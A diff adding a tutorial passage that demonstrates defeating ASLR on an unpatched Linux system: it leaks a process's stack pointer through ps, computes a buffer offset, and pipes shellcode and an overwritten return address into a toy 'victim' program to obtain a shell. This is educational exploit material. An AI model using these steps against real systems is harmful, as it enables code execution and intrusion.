@@ -1,0 +1,50 @@
+
+The Importance of Being Patched
+
+Just for fun, we’ll take a detour and look into ASLR. In the old days, you could read the ESP register of any process by looking at /proc/pid/stat. This leak was plugged long ago. (Nowadays, a process can spy on a given process only if it has permission to ptrace() it.)
+
+Let’s pretend we’re on an unpatched system, as it’s more satisfying to cheat less. Also, we see first-hand the importance of being patched, and why ASLR needs secrecy as well as randomness.
+
+Inspired by a presentation by Tavis Ormandy and Julien Tinnes, we run:
+
+$ ps -eo cmd,esp
+
+First, we run the victim program without ASLR:
+
+$ setarch `arch` -R  ./victim
+
+and in another terminal:
+
+$ ps -o cmd,esp -C victim
+./victim           ffffe038
+
+Thus while the victim program is waiting for user input, it’s stack pointer is 0x7fffffe038. We calculate the distance from this pointer to the name buffer:
+
+$ echo $((0x7fffffe090-0x7fffffe038))
+88
+
+We are now armed with the offset we need to defeat ASLR on older systems. After running the victim program with ASLR reenabled:
+
+$ ./victim
+
+we can find the relevant pointer by spying on the process, then adding the offset:
+
+$ ps -o cmd,esp -C victim
+./victim           43a4b538
+$ printf %x\\n $((0x7fff43a4b538+88))
+7fff43a4b590
+
+Perhaps it’s easiest to demonstrate with named pipes:
+
+$ mkfifo pip
+$ cat pip | ./victim
+
+In another terminal, we type:
+
+$ sp=`ps --no-header -C victim -o esp`
+$ a=`printf %016x $((0x7fff$sp+88)) | tac -r -s..`
+$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ;
+cat ) > pip
+
+and after hitting enter a few times, we can enter shell commands.
+
